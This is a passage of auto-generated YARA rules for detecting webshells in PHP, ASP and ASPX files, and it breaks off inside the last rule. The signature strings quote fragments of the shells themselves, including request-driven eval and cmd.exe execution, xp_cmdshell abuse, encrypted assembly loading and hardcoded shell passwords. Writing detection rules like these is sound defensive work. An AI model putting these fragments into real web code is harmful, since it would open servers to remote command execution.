      $s17 = "Db7hvqPaiMS8JS/txYk1o/KDTAPsnB4GuKuXADi5x7j7egn3F8ntZkTeTV3QGmicTmq1Cjf7RHiZqjEhqGfh+g2DxmMZ+l/3nP7PM0Df4kEYjQneClg6sX9/HAzDYyXG" ascii
      $s18 = "51fViEb9j8UR6xHjZ0e2zkr2TbgQncwDUkG2b4uLnYNgQYsEAzg354WGvPDSXxSCMDNq6z47fy2idTWcbnKu6rke2tSQkcmF175JnticI5iRXElEMaupVu3P5MHLsn0o" ascii
      $s19 = "eyr5ktOtG7f0DDi21/DVFU90VSW5EJUcbMuf7kY8B5S7+rbSu+hKjECzHtFa458k+Sh1+/ioItMPczB0bSngTu7VxtxGxskXMzCInRPRwq1kf3ehbg2HlRjgzr7XByvj" ascii
      $s20 = "1P8J0bTqMywzXCbp56fv1+e7rn+VZa+uvaer1Y999LmviPNAhigk/xu4SWqolpXQLSIv8kM+JQqdJhOCvvRBiNUQd09xHYgamPwuCbUS5j5XhJi4R8vndhATirn0DxXW" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 200KB and
      1 of ($x*) and 4 of them
}

rule webshell_php_ghost {
   meta:
      description = "webshell - file ghost.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "58ac119dde3b81b190564264454ac09d5d3624afb01f47c446b24b54ce4e5754"
   strings:
      $x1 = "7L37dxzXdSb6u7yW/4dyG6MGbBCo94MgYNZTos2XCVIvgsE0uhtAi0B3u7vBhyje/0XWTOJxPBNToiTrSVuSY0m2JdmSJY+Xk5vxOJmb0VVyY89NZsZx7vedU1Vd1Q8Q" ascii
      $s2 = "Fn9a1/ffG5+Jx2lA9DO68tdkq/UDLLbin4yUlD9iNGKppix1XS61eZBFFO0UFpEwKV9EfrndIs5IAxYnpsDyh+x3afJS9zpdyXWH04pHKfI5lijxA8dWz64WVlBUEC90" ascii
      $s3 = "hHRVZUEZPlhQqpUlub1nNnsYWJG5GfhPID/x24L4UTNzDjd8WGB7hYfu6MO82yW5perrO822nN4d8hyuhRxKvVfHc/xt6MXHj/AjfhgyxVKlkeYeGa/Y39vAr7PpP/Lx" ascii
      $s4 = "KeVztVcp9zVJ9ZPdinUVHU5XBe1C56YnOt+n/Y29waDTztu7efPFr9348LYtUgUHWry4XMnx/lq1tladu9O+bv3io/W1cYd9keY/al910Veq2haR2AQqg6600bmS95M1" ascii
      $s5 = "//<img width=1 height=1 src=\"http://websafe.facaiok.com/just7z/sx.asp?u=***.***.***.***/ghost.php&p=ghost\"/>" fullword ascii
      $s6 = "Ws2qFek6rWJBV/oaf4w+CB0CRZ3ca1r8aZWUojcdy82UM0FtIPKaGB8PMQsXL9BYLmIUlBT8LAWQ8PPSaaBux1qJuL5aLDkRpxE5E2mYiRcWFH78kSBeRySMqomEYE3s" ascii
      $s7 = "/TvK7DAeAC5ESirCb3OwVIhYTetyjWXk7JBJMbmyUhJBSwDqPJGqrgnD+tpCq11/dG1pLAw2axRLfZtGUaLQKE32/LuGv+vNnvjcvSL+qV/ZryM5esrzgw5Bpg7ebQLs" ascii
      $s8 = "8hxtoXQ0RceCsrFTHz+LGm3h9qZMSVdT3zbl2Klh7fLlywuO1m3VF+qd3cWdhVq/+4UdTERqgLterQzNlPvRoHylVKxK+ZR/uY0zhkgrocgcBcsVlW4SPfzXyISoSPYw" ascii
      $s9 = "Y9ASn9AxxZXtssFJZbiBxC/QBmnzGmmBvgkafcOZ8MaBbKXfm8gSxb4NYac0GdfBm0mmtO9N/4VZV03tNjWnjowe60zVx6tVEyEZXG4gkdZH520hTBXHe7t9egvk9yLz" ascii
      $s10 = "bF2myYTIBbaFOAB8iB1GCopbyWLe3ALRwDZApSA3kJDqgwmRMAA5mLJQKBlMf8GbkcR6GxTtUDUgEsBjeFpFy3DASypoBDfoVU2rhs8se/xN4yEyU7GETBYNeQ24wL1P" ascii
      $s11 = "EBefmhYz/6q8D4Y5FcQFx1zXhCyG9YH3uTnkc8+So0O/IrcwRk6rLu/to1GWNka8iSVyljN1oqhrpm2K/ngfJ/PbhAYPhIH0wR5FYBbP0OQ8RcCnIZ+mfYl6ug5oyBuS" ascii
      $s12 = "tB8y/nBt6htz6Ts9vDJ0dzrACJ4iT07FlseOP9JoXVLEyehyRSKCysoTf/2TH7/6s9f+7LBypNXu7g0UCWLk8vUrBTeJiiImc7lyjbz5ekURJ7LLFXmWa6k8yyVfSduR" ascii
      $s13 = "1H1EFI0IWKWFCRvYFMkSISaBicDNwPtji156NhOceJ4HGeTRJdGIIuaINAy6dUQ6zyugIUAzcYTHsBHShkBzUWSJ1JpuyPlzGfsS84CVDu0Gcx15zDuEFzLxGhw/1HuP" ascii
      $s14 = "Axy/X0ec4bQj+XHYEb/v19HtRQNn4RPbi/lWFKuXnh2KHVeYe7mXsDOFewufA0KJKJhZOXPZ73gs7NKnUzPerHxf4s28BLRjHh6dr/h17Kn24CzescIDM+P2m6PX3BKR" ascii
      $s15 = "E8yjbFcFCElMERdtMskdtUXoyw5YOI+rAKyAX0OwNJ+7RWNaShO8zSfTpSMDpJrNlIyYcuHhJ4J6HKBwU2QVALoJIdO0kD7dWGeGE6g07QL/BCgb4oVNiH4oudh4Zpgw" ascii
      $s16 = "nZo8MlaySxcW0vVAwc7eYEl0t3oa1HZCcFA0MF/t7bWr80y+Pc9oahHDvViXF0T/wZF/ld4lMduTlyXM1rdrvVnDmpub+1d/sKKsiHBvxo3X+t3iONPN2gXiu9i83NwY" ascii
      $s17 = "4AFxQOG1Dc2htqZhfFRjIRcxgQHPYcDvYiAJTB84P9YQK8HzGcejyYauJTxaSnRozCBWmrnIZYJApznXsmjKwkbnsQbGAWYGSQwUxtMAC5NGizw1TZOSTo94emHFhEMa" ascii
      $s18 = "5vFKkw9KE5zNLx5elpp11l/iGVYU6vohLUzUQ5oWqYf8KPAOqWqomklkub4aoNYbv33pz279gr6NWUXNcFTP1tVDoe54qBjGh3zTiw+ZpmlZhmWSI453d3/67qvbzZ0d" ascii
      $s19 = "F/gJGg9Wh+euFLH0qYIMpSaIJ1hJblOD5zYaeI1KNOwBsBApxHQZotcNQCoENsQ8KJmnBXTFTSBzQLjYuyBpHitjNycGNAXLoG+R4YHdWvRV0SnBeQgBrgrNnPoSpKUB" ascii
      $s20 = "LGsi/bJfC7KgNAbmJak9jW7CsrsuTZkM8VgQ9syl8TGNKGEMziq0MTQsirCtLCboqRcZOXZYgcJXdKKYr9YmkOT+HRI7jKGTYfDRPE8P7rBJovvJ70AUnzUtz0Lf/Lp4" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 200KB and
      1 of ($x*) and 4 of them
}

rule devshell_2 {
   meta:
      description = "webshell - file devshell.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "f8751474732f13b4139d18f33929a7fa88ca7b255455b2fb814fbc1d61ad8a6a"
   strings:
      $s1 = "shell_password = \"devilzc0der\"" fullword ascii
      $s2 = "shell_fake_name = \"Server Logging System\"" fullword ascii
      $s3 = "shell_name = \"devilzShell\"" fullword ascii
      $s4 = "'# devilzShell <[asp]>" fullword ascii
      $s5 = "shell_title = \" :: \" & shell_name & \" ::\"" fullword ascii
      $s6 = "+A0Gs9+.B* /DXsncNkd2^lzP{~ExG" fullword ascii
      $s7 = "shell_fav_port = \"12345\"" fullword ascii
      $s8 = "shell_version = \"v1\"" fullword ascii
      $s9 = "|z?s&oM)D0 -X2W3QzZ.MfW&31DQ.:$2K;s%0i&HEPLm@#@&J2#0M3oGbhhpVqjS2\\\\WS0UxAhpkE%" fullword ascii
      $s10 = "<%@ Language = \"VBscript.Encode\" %>" fullword ascii
      $s11 = "bQaH0S3Hs:\\AAUj" fullword ascii
      $s12 = "'# greets: devilzc0der(s) and all of you who love peace and freedom" fullword ascii
      $s13 = "shell_color = \"#374374\"" fullword ascii
      $s14 = "h&f3y8loG1mM#41fmUHy*-Ndt7m!k,~C." fullword ascii
      $s15 = "xORLnD2s+snxDAz(9`B[r7{n\\msE# kYHV+cNbdw^lzP{PvUKx+EIJ,[{@#@&EJ,[|@#@&J77(WaRkOX^+ [b/wsCHPxPEr" fullword ascii
      $s16 = "&bzbz9VV3}jI* sH3zb(2nlx&8Ov05q)AJ~L{@#@&Jt}W1+SlhM9xe+hvSb(oSob5)06I1ItnWOH1b)bz)?`.6]n*Ze(&'E@#@&A~kU9'rK.$pz)Hzb)bAb))zzzR)bd" ascii
      $s17 = "lq a6pJ~[m@#@&J7VbU+ tnrTtYl+Zwair~L{@#@&J)JPL{@#@&JrP'{@#@&EWKD:PEPL{@#@&E7:mDTkU)T~mEOWpEPL{@#@&rdYnaDOCVbL" fullword ascii
      $s18 = " m!D/K.xBaWbxO+.vpY4kk /DXsncmE.dKDxB4C" fullword ascii
      $s19 = "xOAH(Nv4GabN# -mV;+pE,[m@#@&rJPL{@#@&Ji\\CD,tCdbVP{~wKVlc.nw^l1+cBmmhr]K|mBBP2GMYx;h*iEPLm@#@&EiNKmEs+" fullword ascii
      $s20 = "o1+!IMjueT.4U%vwLm}%e%4?W+TjGKrP'{@#@&Jhr4e+9b90+Az?d1IrHwGJrNj Vr!yn]5!Z3n;Z*UpK$S*mW;LND(K(Y$$zlnE~fD7W\"]9b_O#&3/J,'|@#@&rEzH" ascii
   condition:
      uint16(0) == 0x253c and filesize < 200KB and
      8 of them
}

rule r00tsFSO {
   meta:
      description = "webshell - file r00tsFSO.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "9f8fe38a42a615aa843f20a33ab83d433dd92eba7747a2c19567de0421405543"
   strings:
      $x1 = "</b><input type=text name=P VALUES=123456>&nbsp;<input type=submit value=Execute></td></tr></table></form>\":o SI:SI=\"\":If tri" ascii
      $x2 = "\"\";var speed = 10000;var x = 0;var color = new initArray(\"\"#ffff00\"\", \"\"#ff0000\"\", \"\"#ff00ff\"\",\"\"#0000ff\"\",\"" ascii
      $x3 = "\",1000);</SCRIPT><a href=http://hi.baidu.com/r00ts target='_blank'>hi.baidu.com/r00ts</a></b></td></tr></table></table>\":asds=" ascii
      $x4 = "request.form(\"MMD\") & \"'\":set recResult = adoConn.Execute(strQuery):If NOT recResult.EOF Then:Do While NOT recResult.EOF:str" ascii
      $x5 = "ODE','REG_DWORD',1;SELECT * FROM OPENROWSET('MICROSOFT.JET.OLEDB.4.0',';DATABASE=\" & PATH &\"','SELECT SHELL(\"&CHR(34)&\"CMD.E" ascii
      $x6 = ".Connection\"):adoConn.Open \"Provider=SQLOLEDB.1;Password=\"&password&\";User ID=\"&id:strQuery = \"exec master.dbo.xp_cMdsHeLl" ascii
      $x7 = "if ShellPath=\"\" Then ShellPath=\"cmd.exe\"" fullword ascii
      $s8 = "       STRQUERY = \"SELECT * FROM OPENROWSET('MICROSOFT.JET.OLEDB.4.0',';DATABASE=\" & PATH &\"','SELECT SHELL(\"&CHR(34)&\"CMD." ascii
      $s9 = "\"\");FullDbStr(0);return false;}return true;}function FullDbStr(i){if(i<0){return false;}Str=new Array(12);Str[0]=\"\"Provider=" ascii
      $s10 = "Set DD=CM.exec(ShellPath&\" /c \"&DefCmd)" fullword ascii
      $s11 = "       STRQUERY = \"DROP TABLE [JNC];EXEC MASTER..XP_REGWRITE 'HKEY_LOCAL_MACHINE','SOFTWARE\\MICROSOFT\\JET\\4.0\\ENGINES','SAN" ascii
      $s12 = "</td></tr></table></form><hr><br><form method=post><table width=90% border=0 align=center><tr><td id=s align=center height=22><b" ascii
      $s13 = "@O OUT EXEC SP_OAMETHOD @O,'RUN',NULL,'CMD /C \"&REQUEST(\"CMD\")&\" > 8617.TMP',0,TRUE;BULK INSERT [JNC] FROM '8617.TMP' WITH (" ascii
      $s14 = "qq=\"<form name=\"\"hideform\"\" method=\"\"post\"\" action=\"\"\"&URL&\"\"\" target=\"\"FileFrame\"\"><input type=\"\"hidden\"" ascii
      $s15 = ": </td><td width='90%' id=d><input name='path' type='text' value='C:\\Documents and Settings\\All Users\\Application Data\\Syman" ascii
      $s16 = "<a><a href='javascript:ShowFolder(\"\"C:\\\\Documents and Settings\\\\All Users\\\\\"\")'>(5)" fullword ascii
      $s17 = "<a>&nbsp;&nbsp;&nbsp;<a href='javascript:ShowFolder(\"\"C:\\\\Documents and Settings\\\\All Users\\\\" fullword ascii
      $s18 = "<a><a href='javascript:ShowFolder(\"\"C:\\\\Documents and Settings\\\\All Users\\\\Documents\"\")'>(4)" fullword ascii
      $s19 = "<a><a href='javascript:ShowFolder(\"\"C:\\\\Documents and Settings\\\\All Users\\\\" fullword ascii
      $s20 = "       STRQUERY = \"SELECT * FROM OPENROWSET('MICROSOFT.JET.OLEDB.4.0',';DATABASE=\" & PATH &\"','SELECT SHELL(\"&CHR(34)&\"CMD." ascii
   condition:
      uint16(0) == 0x253c and filesize < 300KB and
      1 of ($x*) and 4 of them
}

rule webshell_aspx_xslt {
   meta:
      description = "webshell - file xslt.aspx"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "856f45ee3c3cb1f86285f7fe788e3ef7e8bb6f7f79b3aa839a95adde88a09de8"
   strings:
      $s1 = "<msxsl:assembly name=\"\"System.Data, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\"\"/>" fullword ascii
      $s2 = "<msxsl:assembly name=\"\"System.Configuration, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a\"\"/>" fullword ascii
      $s3 = "<msxsl:assembly name=\"\"System.Web, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a\"\"/>" fullword ascii
      $s4 = "<msxsl:assembly name=\"\"mscorlib, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\"\"/>" fullword ascii
      $s5 = "<![CDATA[function xml() {var c=System.Web.HttpContext.Current;var Request=c.Request;var Response=c.Response;var Server=c.Server;" ascii
      $s6 = "<xsl:template match=\"\"/root\"\">" fullword ascii
      $s7 = "<%@ import Namespace=\"System.Xml.Xsl\"%>" fullword ascii
      $s8 = "<xsl:stylesheet version=\"\"1.0\"\" xmlns:xsl=\"\"http://www.w3.org/1999/XSL/Transform\"\" xmlns:msxsl=\"\"urn:schemas-microsoft" ascii
      $s9 = "<%@ import Namespace=\"System.Xml\"%>" fullword ascii
      $s10 = "<![CDATA[function xml() {var c=System.Web.HttpContext.Current;var Request=c.Request;var Response=c.Response;var Server=c.Server;" ascii
      $s11 = "<xsl:stylesheet version=\"\"1.0\"\" xmlns:xsl=\"\"http://www.w3.org/1999/XSL/Transform\"\" xmlns:msxsl=\"\"urn:schemas-microsoft" ascii
      $s12 = "</msxsl:script>" fullword ascii
      $s13 = "<msxsl:script language=\"\"JScript\"\" implements-prefix=\"\"zcg\"\">" fullword ascii
      $s14 = "string xml=@\"<?xml version=\"\"1.0\"\"?><root>test</root>\";" fullword ascii
      $s15 = "eval(Request.Item['a'],'unsafe');Response.End();}]]>" fullword ascii
      $s16 = "xct.Load(xsldoc,XsltSettings.TrustedXslt,new XmlUrlResolver());" fullword ascii
      $s17 = "xsldoc.LoadXml(xslt);" fullword ascii
      $s18 = "XslCompiledTransform xct=new XslCompiledTransform();" fullword ascii
      $s19 = "string xslt=@\"<?xml version='1.0'?>" fullword ascii
      $s20 = "xmldoc.LoadXml(xml);" fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 4KB and
      8 of them
}

rule webshell_aspx_a1 {
   meta:
      description = "webshell - file a1.aspx"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "aaee2187c1577cebb97cd0fc985c6a3b86bcf5db92cdf284f3fb1a598139d466"
   strings:
      $x1 = "        var r = new ActiveXObject(\"\"WScript.Shell\"\").Exec(\"\"cmd /c \"\"+command);" fullword ascii
      $s2 = "    <msxsl:assembly name=\"\"System.Data, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\"\"/>" fullword ascii
      $s3 = "    <msxsl:assembly name=\"\"System.Configuration, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a\"\"/>" fullword ascii
      $s4 = "    <msxsl:assembly name=\"\"System.Web, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a\"\"/>" fullword ascii
      $s5 = "<xsl:template match=\"\"/root\"\">" fullword ascii
      $s6 = "<%@ import Namespace=\"System.Xml.Xsl\"%>" fullword ascii
      $s7 = "<xsl:stylesheet version=\"\"1.0\"\" xmlns:xsl=\"\"http://www.w3.org/1999/XSL/Transform\"\" xmlns:msxsl=\"\"urn:schemas-microsoft" ascii
      $s8 = "<%@ import Namespace=\"System.Xml\"%>" fullword ascii
      $s9 = "<xsl:stylesheet version=\"\"1.0\"\" xmlns:xsl=\"\"http://www.w3.org/1999/XSL/Transform\"\" xmlns:msxsl=\"\"urn:schemas-microsoft" ascii
      $s10 = "    <msxsl:assembly name=\"\"mscorlib, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\"\"/>" fullword ascii
      $s11 = "string xml=@\"<?xml version=\"\"1.0\"\"?><root>test</root>\";" fullword ascii
      $s12 = "xslt_settings.EnableScript = true;" fullword ascii
      $s13 = "        var command = Request.Item['cmd'];" fullword ascii
      $s14 = "        var c=System.Web.HttpContext.Current;var Request=c.Request;var Response=c.Response;" fullword ascii
      $s15 = "xsldoc.LoadXml(xslt);" fullword ascii
      $s16 = "string xslt=@\"<?xml version='1.0'?>" fullword ascii
      $s17 = "xmldoc.LoadXml(xml);" fullword ascii
      $s18 = "            Str = Str + OutStream.readAll();" fullword ascii
      $s19 = "    </msxsl:script>" fullword ascii
      $s20 = "    <msxsl:script language=\"\"JScript\"\" implements-prefix=\"\"zcg\"\">" fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 5KB and
      1 of ($x*) and 4 of them
}

rule webshell_aspx_a {
   meta:
      description = "webshell - file a.aspx"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "ef59322c0709c224cb2d4fa6c117ddf20dc85e77194e4bba86840727ba965c04"
   strings:
      $s1 = "        <msxsl:assembly name=\"\"System.Data, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\"\"/>" fullword ascii
      $s2 = "        <msxsl:assembly name=\"\"System.Web, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a\"\"/>" fullword ascii
      $s3 = "        <msxsl:assembly name=\"\"System.Configuration, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a\"\"/>" fullword ascii
      $s4 = "<xsl:template match=\"\"/root\"\">" fullword ascii
      $s5 = "<%@ import Namespace=\"System.Xml.Xsl\"%>" fullword ascii
      $s6 = "<xsl:stylesheet version=\"\"1.0\"\" xmlns:xsl=\"\"http://www.w3.org/1999/XSL/Transform\"\" xmlns:msxsl=\"\"urn:schemas-microsoft" ascii
      $s7 = "<%@ import Namespace=\"System.Xml\"%>" fullword ascii
      $s8 = "<xsl:stylesheet version=\"\"1.0\"\" xmlns:xsl=\"\"http://www.w3.org/1999/XSL/Transform\"\" xmlns:msxsl=\"\"urn:schemas-microsoft" ascii
      $s9 = "        <msxsl:assembly name=\"\"mscorlib, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\"\"/>" fullword ascii
      $s10 = "string xml=@\"<?xml version=\"\"1.0\"\"?><root>test</root>\";" fullword ascii
      $s11 = "        <![CDATA[function xml() {var c=System.Web.HttpContext.Current;var Request=c.Request;var Response=c.Response;var Server=c" ascii
      $s12 = ".Server;eval(Request.Item['a'],'unsafe');Response.End();}]]>" fullword ascii
      $s13 = "        <![CDATA[function xml() {var c=System.Web.HttpContext.Current;var Request=c.Request;var Response=c.Response;var Server=c" ascii
      $s14 = "xct.Load(xsldoc,XsltSettings.TrustedXslt,new XmlUrlResolver());" fullword ascii
      $s15 = "xsldoc.LoadXml(xslt);" fullword ascii
      $s16 = "XslCompiledTransform xct=new XslCompiledTransform();" fullword ascii
      $s17 = "string xslt=@\"<?xml version='1.0'?>" fullword ascii
      $s18 = "xmldoc.LoadXml(xml);" fullword ascii
      $s19 = "xct.Transform(xmldoc,null,new MemoryStream());" fullword ascii
      $s20 = "    </msxsl:script>" fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 4KB and
      8 of them
}

rule webshell_aspx_123 {
   meta:
      description = "webshell - file 123.aspx"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "52652191dd5bb9e3974cb1c62bc46968e94ad4c67b84a2a330ebaec19a0fd18b"
   strings:
      $x1 = "<%@ Page Language=\"C#\"%><%try{string key = \"202cb962ac59075b\";string pass = \"123\";string md5 = System.BitConverter.ToStrin" ascii
      $x2 = "System.Security.Cryptography.MD5CryptoServiceProvider().ComputeHash(System.Text.Encoding.Default.GetBytes(pass + key))).Replace(" ascii
      $s3 = "naged().CreateDecryptor(System.Text.Encoding.Default.GetBytes(key), System.Text.Encoding.Default.GetBytes(key)).TransformFinalBl" ascii
      $s4 = "System.Convert.ToBase64String(new System.Security.Cryptography.RijndaelManaged().CreateEncryptor(System.Text.Encoding.Default.Ge" ascii
      $s5 = "tBytes(key), System.Text.Encoding.Default.GetBytes(key)).TransformFinalBlock(r, 0, r.Length))); Context.Response.Write(md5.Subst" ascii
      $s6 = "ock(data, 0, data.Length);if (Context.Session[\"payload\"] == null){ Context.Session[\"payload\"] = (System.Reflection.Assembly)" ascii
      $s7 = "se{ object o = ((System.Reflection.Assembly)Context.Session[\"payload\"]).CreateInstance(\"LY\"); o.Equals(Context); o.Equals(da" ascii
      $s8 = "\"-\", \"\");byte[] data = System.Convert.FromBase64String(Context.Request[pass]);data = new System.Security.Cryptography.Rijnda" ascii
      $s9 = " byte[] r = System.Convert.FromBase64String(o.ToString()); Context.Response.Write(md5.Substring(0, 16)); Context.Response.Write(" ascii
      $s10 = "<%@ Page Language=\"C#\"%><%try{string key = \"202cb962ac59075b\";string pass = \"123\";string md5 = System.BitConverter.ToStrin" ascii
      $s11 = "of(System.Reflection.Assembly).GetMethod(\"Load\", new System.Type[] { typeof(byte[]) }).Invoke(null, new object[] { data }); ;}" ascii
      $s12 = "ring(16));}}catch(System.Exception){}%>" fullword ascii
      $s13 = "202cb962ac59075b" ascii
   condition:
      uint16(0) == 0x253c and filesize < 3KB and
      1 of ($x*) and 4 of them
}

rule webshell_aspx_cmd {
   meta:
      description = "webshell - file cmd.aspx"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "181feef51991b162bdff5d49bb7fd368d9ec2b535475b88bc197d70d73eef886"
   strings:
      $s1 = "<asp:TextBox id=\"xpath\" runat=\"server\" Width=\"300px\">c:\\windows\\system32\\cmd.exe</asp:TextBox>        " fullword ascii
      $s2 = "  myProcessStartInfo.UseShellExecute = false            " fullword ascii
      $s3 = "  myProcessStartInfo.Arguments=xcmd.text            " fullword ascii
      $s4 = "<%@ import Namespace=\"System.Diagnostics\" %>" fullword ascii
      $s5 = "  Dim myProcessStartInfo As New ProcessStartInfo(xpath.text)            " fullword ascii
      $s6 = "<%@ import Namespace=\"system.IO\" %>" fullword ascii
      $s7 = "  myProcessStartInfo.RedirectStandardOutput = true            " fullword ascii
      $s8 = "  Dim myStreamReader As StreamReader = myProcess.StandardOutput            " fullword ascii
      $s9 = "  myProcess.Close()            " fullword ascii
      $s10 = "  myProcess.Start()            " fullword ascii
      $s11 = "  Dim myProcess As New Process()            " fullword ascii
      $s12 = "  myProcess.StartInfo = myProcessStartInfo            " fullword ascii
      $s13 = "<asp:TextBox id=\"xcmd\" runat=\"server\" Width=\"300px\" Text=\"/c net user\">/c net user</asp:TextBox>        " fullword ascii
      $s14 = "Sub RunCmd(Src As Object, E As EventArgs)            " fullword ascii
      $s15 = "<script runat=\"server\">      " fullword ascii
      $s16 = "<p><asp:Button id=\"Button\" onclick=\"runcmd\" runat=\"server\" Width=\"100px\" Text=\"Run\"></asp:Button>        " fullword ascii
      $s17 = "<%@ Page Language=\"VB\" Debug=\"true\" %>" fullword ascii
      $s18 = "<p><asp:Label id=\"L_p\" runat=\"server\" width=\"80px\">Program</asp:Label>        " fullword ascii
      $s19 = "<p><asp:Label id=\"result\" runat=\"server\"></asp:Label>       " fullword ascii
      $s20 = "<form runat=\"server\">        " fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 4KB and
      8 of them
}

rule webshell_aspx_a3 {
   meta:
      description = "webshell - file a3.aspx"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "75a006628b803b85247966ed7d29e944cf8cb543d60017dbed0814808fd7da6a"
   strings:
      $s1 = "<asp:TextBox id=\"xpath\" runat=\"server\" Width=\"300px\">c:\\windows\\system32\\cmd.exe</asp:TextBox>        " fullword ascii
      $s2 = "  myProcessStartInfo.UseShellExecute = false            " fullword ascii
      $s3 = "  myProcessStartInfo.Arguments=xcmd.text            " fullword ascii
      $s4 = "<%@ import Namespace=\"System.Diagnostics\" %>" fullword ascii
      $s5 = "  Dim myProcessStartInfo As New ProcessStartInfo(xpath.text)            " fullword ascii
      $s6 = "<%@ import Namespace=\"system.IO\" %>" fullword ascii
      $s7 = "  myProcessStartInfo.RedirectStandardOutput = true            " fullword ascii
      $s8 = "  Dim myStreamReader As StreamReader = myProcess.StandardOutput            " fullword ascii
      $s9 = "  myProcess.Close()            " fullword ascii
      $s10 = "  myProcess.Start()            " fullword ascii
      $s11 = "  Dim myProcess As New Process()            " fullword ascii
      $s12 = "  myProcess.StartInfo = myProcessStartInfo            " fullword ascii
      $s13 = "<asp:TextBox id=\"xcmd\" runat=\"server\" Width=\"300px\" Text=\"/c net user\">/c net user</asp:TextBox>        " fullword ascii
      $s14 = "Sub RunCmd(Src As Object, E As EventArgs)            " fullword ascii
      $s15 = "<script runat=\"server\">      " fullword ascii
      $s16 = "<p><asp:Button id=\"Button\" onclick=\"runcmd\" runat=\"server\" Width=\"100px\" Text=\"Run\"></asp:Button>        " fullword ascii
      $s17 = "<%@ Page Language=\"VB\" Debug=\"true\" %>" fullword ascii
      $s18 = "<p><asp:Label id=\"L_p\" runat=\"server\" width=\"80px\">Program</asp:Label>        " fullword ascii
      $s19 = "<p><asp:Label id=\"result\" runat=\"server\"></asp:Label>       " fullword ascii
      $s20 = "<form runat=\"server\">        " fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 4KB and
      8 of them
}

rule DarkBlade1_5 {
   meta:
      description = "webshell - file DarkBlade1.5.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "1acff7ac75d73a0c7589e0403e5e7be7b4708faf278f76eb45008710a7f9a4c8"
   strings:
      $x1 = "var oonsd='';function zfzf(path){var regRoot=dzzx(path,'\\\\',true);path=path.substr(regRoot.length+1);var regKey=zsz(path,'" ascii
      $x2 = "conn.execute(\"exec mast\"+mqe+\"er..xp\"+cla+\"_cmdshell'bcp \"\"select binfile from \"&podw&\"..dark_temp\"\" queryout \"\"\"&" ascii
      $x3 = "conn.execute(\"exec mast\"+mqe+\"er..xp\"+cla+\"_cmdshell'bcp \"\"\"&podw&\"..dark_temp\"\" in \"\"\"&wckz&\"\"\" -T -f c:\\tmp." ascii
      $x4 = "conn.Execute(\"Create Table FileData(Id int IDENTITY(0,1) PRIMARY KEY CLUSTERED,strPath VarChar,binContent Image)\")" fullword ascii
      $x5 = "conn.execute(\"exec mast\"+mqe+\"er..xp\"+cla+\"_cmdshell'bcp \"\"select binfile from \"&podw&\"..dark_temp\"\" queryout \"\"\"&" ascii
      $x6 = "conn.execute \"CREATE TABLE [dark_temp] ([id] [int] NULL ,[binfile] [Image] NULL) ON [PRIMARY] TEXTIMAGE_ON [PRIMARY];\"" fullword ascii
      $x7 = "conn.execute \"If object_id('dark_temp')is not null drop table dark_temp\"" fullword ascii
      $x8 = "conn.execute \"CREATE TABLE [dark_temp] ([binfile] [Image] NULL)\"" fullword ascii
      $x9 = "conn.execute(\"EXECUTE mast\"+mqe+\"er..xp\"+cla+\"_cmdshell 'del c:\\tmp.fmt'\")" fullword ascii
      $x10 = "conn.execute(\"EXEC mast\"+mqe+\"er..xp\"+cla+\"_cmdshell 'echo \"&substrfrm&\" >>c:\\tmp.fmt'\")" fullword ascii
      $x11 = "nfe=nfe&\"<a href='http://www.helpsoff.com.cn' target='_blank'>Fuck Tencent</a>\"" fullword ascii
      $x12 = "iiit\"text\",\"fhbej\",\"C:\\WINDOWS\\syste\"+xyjdv+\"m32\\cmd.exe\",\"35%\",\"\",\"\"" fullword ascii
      $x13 = "iiit\"text\",\"ggwz\",\"C:\\WINDOWS\\syste\"+xyjdv+\"m32\\cmd.exe\",\"35%\",\"\",\"\"" fullword ascii
      $x14 = "If mrpwl=\"\"Then mrpwl=Replace(\"x:\\|x:\\Program Files|x:\\Program Files\\Serv\"+shn+\"-U|x:\\Program Files\\RhinoSoft.com|x:" ascii
      $s15 = "'Set rs=conn.Execute(\"select count(*) from \"&svznx)" fullword ascii
      $s16 = "Set soa=wbxx.Execute(str)" fullword ascii
      $s17 = "If ihyn=\"\"Then ihyn=\" /c net u\"+rmct+\"ser > \"&zhyko&\"\\temp.txt\"" fullword ascii
      $s18 = "'Set rs=conn.Execute(\"select count(*) from [\"&svznx&\"]\")" fullword ascii
